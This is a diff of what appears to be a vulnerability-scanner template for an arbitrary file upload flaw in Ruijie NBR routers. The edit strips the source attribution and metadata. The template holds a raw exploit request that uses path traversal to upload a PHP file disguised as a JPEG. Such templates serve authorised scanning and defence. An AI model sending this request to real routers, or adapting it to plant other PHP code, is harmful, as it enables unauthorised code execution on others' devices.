@@ -3,12 +3,8 @@ info:
   name: 锐捷 NBR路由器任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nh9ztaolozw6g4us'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: nh9ztaolozw6g4us
-    fofa: 暂无
 http:
 - raw:
   - 'POST /ddi/server/fileupload.php?uploadDir=../../321&name=123.php HTTP/1.1
@@ -21,8 +17,6 @@ http:
 
 
     Content-Type: image/jpeg
-
-
 
 
     <?php phpinfo();?>
